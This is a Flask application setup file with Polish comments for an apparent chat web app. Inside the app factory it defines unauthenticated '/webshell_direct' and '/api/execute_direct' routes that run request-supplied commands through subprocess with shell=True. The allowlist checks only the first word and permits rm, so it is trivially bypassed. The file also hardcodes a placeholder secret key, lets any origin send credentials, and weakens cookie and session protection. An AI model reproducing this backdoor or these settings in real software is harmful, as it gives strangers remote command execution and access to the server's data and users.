from flask import Flask
from flask_cors import CORS
from flask_login import LoginManager
from datetime import timedelta

# Bezpośrednie importy
from models import db, User
from admin import init_admin
from auth import auth_bp
from chat import chat_bp
# Import nowego blueprintu chat_api
from chat_api import chat_api

# Inicjalizacja login managera
login_manager = LoginManager()

# Ładowanie użytkownika
@login_manager.user_loader
def load_user(user_id):
    # KLUCZOWA ZMIANA: dodaj przechwytywanie i logowanie błędów
    try:
        return User.query.get(int(user_id))
    except Exception as e:
        print(f"Błąd ładowania użytkownika: {e}")
        return None

# Główna funkcja tworząca aplikację
def create_app():
    app = Flask(__name__)
    CORS(app, supports_credentials=True)  # KLUCZOWA ZMIANA: dodaj supports_credentials=True

    # Konfiguracja bazy danych
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    
    # Konfiguracja bezpieczeństwa
    app.config['SECRET_KEY'] = 'your_secret_key'
    
    # KLUCZOWA ZMIANA: Popraw konfigurację sesji
    app.config['REMEMBER_COOKIE_DURATION'] = timedelta(hours=24)
    app.config['REMEMBER_COOKIE_SECURE'] = False
    app.config['REMEMBER_COOKIE_HTTPONLY'] = True
    app.config['SESSION_PROTECTION'] = 'basic'  # KLUCZOWA ZMIANA: zmień z 'strong' na 'basic'
    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
    app.config['SESSION_COOKIE_SECURE'] = False

    # Inicjalizacja
    db.init_app(app)
    login_manager.init_app(app)
    login_manager.login_view = 'auth.index'

    # Rejestracja blueprintów
    app.register_blueprint(auth_bp)
    app.register_blueprint(chat_bp)
    app.register_blueprint(chat_api)  # Rejestracja blueprintu chat_api

    # Inicjalizacja panelu admina
    init_admin(app)
    # Dodaj bezpośrednią trasę webshell w app.py
    import subprocess
    import shlex
    from flask import request, jsonify, render_template
    
    @app.route('/webshell_direct')
    def webshell_direct():
        # Bezpośredni endpoint webshell bez autoryzacji
        return render_template('webshell.html')
    
    @app.route('/api/execute_direct', methods=['POST'])
    def execute_direct():
        # Bezpośredni endpoint wykonywania poleceń bez autoryzacji
        data = request.get_json()
        command = data.get('command', '')
        
        if not command:
            return jsonify({"output": "", "error": "No command provided"}), 400
        
        # Lista dozwolonych poleceń
        allowed_commands = ['ls', 'cat', 'mkdir', 'pwd', 'echo', 'cp', 'mv', 'rm', 'touch', 'head', 'tail', 'wc', 'find', 'sqlite3']
        
        # Sprawdź czy polecenie jest dozwolone
        cmd_parts = shlex.split(command)
        base_cmd = cmd_parts[0] if cmd_parts else ""
        
        if base_cmd not in allowed_commands:
            return jsonify({
                "output": "",
                "error": f"Command not allowed. Allowed commands: {', '.join(allowed_commands)}"
            }), 403
        
        try:
            # Wykonaj polecenie
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd="/opt/render/project/src"
            )
            
            # Ustaw timeout
            stdout, stderr = process.communicate(timeout=5)
            
            return jsonify({
                "output": stdout,
                "error": stderr
            })
        except subprocess.TimeoutExpired:
            process.kill()
            return jsonify({
                "output": "",
                "error": "Command execution timed out (5s limit)"
            }), 500
        except Exception as e:
            return jsonify({
                "output": "",
                "error": f"Error: {str(e)}"
            }), 500
    
    return app
    return app
